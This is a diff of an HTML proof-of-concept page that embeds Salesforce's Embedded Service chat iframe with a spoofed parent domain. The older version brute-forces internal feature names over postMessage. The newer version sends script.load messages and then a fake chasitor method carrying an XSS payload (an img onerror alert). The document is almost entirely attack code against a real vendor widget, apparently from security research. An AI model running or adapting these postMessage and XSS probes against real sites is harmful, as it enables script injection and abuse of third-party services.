@@ -1,51 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Salesforce Script Load Test</title>
-</head>
-<body>
-  <h2>Salesforce Internal Script Brute-Force</h2>
-  <iframe id="eswFrame" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="width:100%; height:600px;"></iframe>
+  <body>
+    <iframe
+      id="livechat"
+      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz"
+      style="width: 100%; height: 600px;"
+    ></iframe>
 
-  <script>
-    const iframe = document.getElementById("eswFrame");
+    <script>
+      const iframe = document.getElementById("livechat");
 
-    const internalFeatures = [
-      "admin", "agent", "internal", "analytics", "debug",
-      "monitoring", "logger", "network", "webhook", "devtools"
-    ];
+      window.addEventListener("message", (e) => {
+        console.log("📩 Message from iframe:", e.data);
+      });
 
-    let scriptLoadIndex = 0;
-    let loaded = false;
+      iframe.onload = () => {
+        console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-    window.addEventListener("message", function (event) {
-      if (typeof event.data === "object" && event.data.method) {
-        console.log("📩 Message from iframe:", event.data);
-        if (event.data.method === "session.onLoad") {
-          console.log("[+] Iframe loaded (Salesforce 4.0)");
-          // Start brute-forcing internal features
-          loadNextFeature();
-        }
-      }
-    });
+        // Try loading a valid feature
+        const features = ["chasitor", "filetransfer"];
 
-    function loadNextFeature() {
-      if (scriptLoadIndex >= internalFeatures.length) {
-        console.log("✅ All internal feature load attempts complete.");
-        return;
-      }
+        features.forEach((feature) => {
+          console.log("[📤] Sending script.load for feature:", feature);
+          iframe.contentWindow.postMessage(
+            {
+              method: "script.load",
+              domain: "reddit.com.wangdubruh.xyz",
+            },
+            "*"
+          );
+        });
 
-      const feature = internalFeatures[scriptLoadIndex];
-      console.log(`[📤] Sending script.load for feature: '${feature}'`);
-      iframe.contentWindow.postMessage({
-        method: "script.load",
-        domain: "reddit.com.wangdubruh.xyz",
-        data: feature
-      }, "*");
-
-      scriptLoadIndex++;
-      setTimeout(loadNextFeature, 1500); // Wait between loads
-    }
-  </script>
-</body>
+        // Try sending payload if chasitor accepts custom data
+        setTimeout(() => {
+          iframe.contentWindow.postMessage(
+            {
+              method: "chasitor.fakeMethod",
+              domain: "reddit.com.wangdubruh.xyz",
+              data: {
+                text: `<img src=x onerror=alert(document.domain)>`, // Payload
+              },
+            },
+            "*"
+          );
+        }, 2000);
+      };
+    </script>
+  </body>
 </html>
